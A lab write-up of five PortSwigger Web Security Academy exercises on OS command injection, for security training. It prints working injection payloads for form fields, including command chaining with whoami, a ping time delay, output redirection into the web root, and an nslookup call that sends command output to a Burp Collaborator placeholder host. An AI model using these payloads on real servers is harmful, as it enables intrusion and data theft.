# OS Command Injection — Lab Write-ups

> **Topic:** OS Command Injection  
> **Platform:** PortSwigger Web Security Academy  
> **Labs Completed:** All  
> **Tools Used:** Burp Suite (Repeater, Intruder), Linux shell knowledge

---

## What is OS Command Injection?

OS command injection (also called shell injection) lets an attacker execute arbitrary system commands on the server hosting the application. If the app passes user input to a shell command without sanitizing it, you can chain your own commands onto it.

The impact is as bad as it gets — you're essentially running commands with the web server's privileges. That usually means reading sensitive files, establishing persistence, pivoting to internal systems, or completely compromising the host.

Shell metacharacters that make this possible: `; | & || && \n $()`

---

## Lab 1 — OS Command Injection, Simple Case
**Level:** Apprentice

**What the lab is about:**  
The stock checker feature calls an OS command that includes a product ID and store ID from the request. No sanitization at all.

**What I did:**  
Intercepted the POST request to `/product/stock`. Original body:
```
productId=1&storeId=1
```

Modified `storeId` to:
```
1; whoami
```

The response returned the output of `whoami` — showing the user the web server was running as (`peter-wiener` in this case).

**Key takeaway:**  
The semicolon `;` terminates the first command and starts a new one. This is the simplest and most reliable separator on Unix systems.

**Mitigation:**  
Never pass user input to OS commands. If it's unavoidable, use language-level API functions instead of shell commands, and apply strict input validation (whitelist allowed characters only).

---

## Lab 2 — Blind OS Command Injection with Time Delays
**Level:** Practitioner

**What the lab is about:**  
The application calls a shell command but doesn't return any output in the response. You confirm the vulnerability exists using time-based inference — making the server sleep for a defined period.

**What I did:**  
The feedback form's email field was vulnerable. Modified the `email` parameter to:
```
email=x||ping+-c+10+127.0.0.1||
```

The server took ~10 seconds to respond (one second per ICMP ping). That confirmed command execution even without visible output.

**Why ping?**  
`ping -c 10 127.0.0.1` sends 10 pings to localhost. Each takes roughly 1 second, giving a predictable 10-second delay without requiring any special tools.

**Key takeaway:**  
Blind command injection is actually more common than direct output injection. If you see a response time that matches your expected delay, that's as good as seeing `whoami` output.

---

## Lab 3 — Blind OS Command Injection with Output Redirection
**Level:** Practitioner

**What the lab is about:**  
Same blind scenario, but this time you redirect command output to a file in the web root and then fetch it directly via the browser.

**What I did:**  
Found that `/var/www/images/` was web-accessible (used for product images). Injected:
```
email=||whoami>/var/www/images/output.txt||
```

Then fetched:
```
GET /image?filename=output.txt
```

The file contained the server's username — confirming successful blind command injection with output retrieval.

**Key takeaway:**  
If you can write to a web-accessible directory, you turn blind injection into visible injection. Always look for file write opportunities.

---

## Lab 4 — Blind OS Command Injection with Out-of-Band Interaction
**Level:** Practitioner

**What the lab is about:**  
No output, can't write to web root. But the server can make outbound network connections. Use Burp Collaborator to confirm execution via DNS/HTTP.

**What I did:**  
```
email=x||nslookup+BURP-COLLABORATOR-SUBDOMAIN||
```

Collaborator received a DNS lookup from the target server. Confirmed blind command injection via out-of-band interaction.

**Key takeaway:**  
`nslookup` is usually available on both Linux and Windows servers and is often not blocked by outbound firewalls. It's the most reliable OOB probe for command injection.

---

## Lab 5 — Blind OS Command Injection with Out-of-Band Data Exfiltration
**Level:** Practitioner

**What the lab is about:**  
Combines OOB interaction with actual data exfiltration — embedding command output in the DNS query itself.

**What I did:**  
```
email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```

The backticks execute `whoami` and the result becomes a subdomain of the Collaborator address. The DNS lookup received by Collaborator was something like `peter-wiener.COLLABORATOR-ID.burpcollaborator.net` — the username embedded right in the domain.

**Key takeaway:**  
Backtick or `$()` command substitution embeds output into strings. This is how you exfiltrate data through DNS when there's no other channel.

---

*OS command injection is one of the highest-impact vulnerabilities in web security. The labs here cover everything from trivial direct injection to sophisticated blind exfiltration — each technique builds on the last.*
